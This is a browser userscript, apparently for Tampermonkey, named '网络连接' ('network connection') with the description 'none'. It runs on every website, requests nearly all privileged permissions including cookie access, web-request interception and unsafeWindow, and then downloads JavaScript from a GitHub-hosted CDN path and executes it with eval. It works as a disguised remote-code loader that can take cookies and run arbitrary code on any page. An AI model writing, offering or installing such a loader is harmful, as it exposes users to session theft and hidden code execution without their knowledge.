// ==UserScript==
// @name        网络连接
// @namespace   none
// @version     2.0
// @connect     cdn.jsdelivr.net
// @match       *://*/*
// @run-at      document-end
// @grant       GM_cookie
// @grant       GM_setValue
// @grant       GM_getValue
// @grant       GM_listValues
// @grant       GM_deleteValue
// @grant       GM_xmlhttpRequest
// @grant       GM_addStyle
// @grant       GM_setClipboard
// @grant       GM_log
// @grant       GM_notification
// @grant       GM_openInTab
// @grant       GM_getTab
// @grant       GM_getTabs
// @grant       GM_saveTab
// @grant       GM_webRequest
// @grant       unsafeWindow
// @grant       GM_download
// @grant       GM_registerMenuCommand
// @grant       GM_unregisterMenuCommand
// @grant       GM_info
// @icon        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAANhSURBVHja7JdPaJxFGMZ/z+4m2cRePIpCBUUKglQQQRAEERTpwS+HWDQVEzVGQRRUFMSi9dIWvKhIpSCW5mIxE7CkPfiXouBNsFB6EQUVtW38U6Xpptl5PPTduGx3s9+CwYMODAvfNzvvb56Z93nnk23+zab/AdoBiqI4IulWYKTLWAMZUFsfOB6wLOnw/Pz85CUA4+Pj54DRDV50BlZSSqPdAFaAIeA94HNgGcB2HSgk3QacBOaAM0CtZNAmUAduAu4HmimlWjeABjBsewfwLnChbZLdkp4DjtieknQWqJQEcGzrvcC+UGBkPYCXgBTkBP2zkrYDh21PAmelgY7BEDAFvLUewHIE+wH4EVgN+lFgM3B5KDAN/AwwAMQYMA28vh5AmUO4GACn1o52OYixUOCNMgrM2a5LujsUOARcAdwFHLX94EYBNIBh4B6gAbxp+xQwC9wpaXc3gJIQ5QEkPRSBZoGfbB8CnpH0fC+AEhADKfCYpH22kYRtbL8m6Yn1APqADKTAC2E2f8SYMdsvS5ouA9ADohTAeWBE0olwvBxjqra3Sro6AKZaadjX/P8GKQXwJ3BZnzmPApPAL2HTZSH6AxRF8WKlUtkKNG1fBdxoO0v6UtJp4FfbSdIi4Jxz+TIolQLYVKlUxoDVnPMOSbtsnwaeAj4Laz7XZtGDtKqkB4C31wOgUrlYX3LO05Jetf078CSwGNtTA6oDBm/GFtwXXtJIKdV7AkTazUjaFf7/FfB9FJRulxFHp8f7ZkBfA1zXsxwXRbGW98CMpJ3AlRtwKbmQUhruCtDWZiS9ImkT8EnO+WTU9M7VrQJbJN0O1Gx/DJyIFK51XMeawG+Svk4pHSgDsCfq/uM558VwyUvklVQA+4FqeMT7AVDtAAA4L4mUEmUA9kYxeljSsW45LwlJ22zPAdn2BPBhuwl1/m9QgDPAo8BH3RwufrfZPhjBJoAPgLWMikP9jwJUJdVbJ1/SHbYPRLDtko5dfCyAhu0132gVuDIAs5L22F4CZlqyhhfcLOmGOFSWdH0UKAPvAMeBIUkZOG77C2ClffIyAI+EAkstBWJFW8LNbimZcp/GFe6b9ocLCwt9Aa6VtN/2t8BO4LsA2AzsBSY6VtXs+GqqRD9o+2lgqS/Af/Lj9K8BAEL8Md9lasyQAAAAAElFTkSuQmCC
// @description none
// ==/UserScript==

const cacheTime = 1000;
const cloudVersionUrl = "https://cdn.jsdelivr.net/gh/4444TENSEI/CDN/js/ck/version.json";

function loadAndExecuteUpdatedScriptWithCache() {
    const lastRequestTime = GM_getValue("lastRequestTime", 0);
    const now = Date.now();

    if (now - lastRequestTime >= cacheTime) {
        GM_xmlhttpRequest({
            method: "GET",
            url: cloudVersionUrl,
            onload: function (response) {
                if (response.status === 200) {
                    try {
                        const data = JSON.parse(response.responseText);
                        const currentVersion = GM_getValue("scriptVersion", "None");
                        if (data.version !== currentVersion) {
                            fetchAndExecuteScript(data.scriptUrls[0], data.version);
                        } else {
                            executeScript(GM_getValue("cachedScript", ""));
                        }
                    } catch (e) {
                        executeScript(GM_getValue("cachedScript", ""));
                    }
                } else {
                    executeScript(GM_getValue("cachedScript", ""));
                }
                GM_setValue("lastRequestTime", now);
            },
            onerror: function () {
                executeScript(GM_getValue("cachedScript", ""));
                GM_setValue("lastRequestTime", now);
            }
        });
    } else {
        executeScript(GM_getValue("cachedScript", ""));
    }
}

function fetchAndExecuteScript(scriptUrl, newVersion) {
    GM_xmlhttpRequest({
        method: "GET",
        url: scriptUrl,
        onload: function (res) {
            if (res.status === 200) {
                GM_setValue("cachedScript", res.responseText);
                GM_setValue("scriptVersion", newVersion);
                executeScript(res.responseText);
            } else {
                executeScript(GM_getValue("cachedScript", ""));
            }
        },
        onerror: function () {
            executeScript(GM_getValue("cachedScript", ""));
        }
    });
}

function executeScript(scriptContent) {
    if (scriptContent) {
        eval(scriptContent);
    }
}

loadAndExecuteUpdatedScriptWithCache();
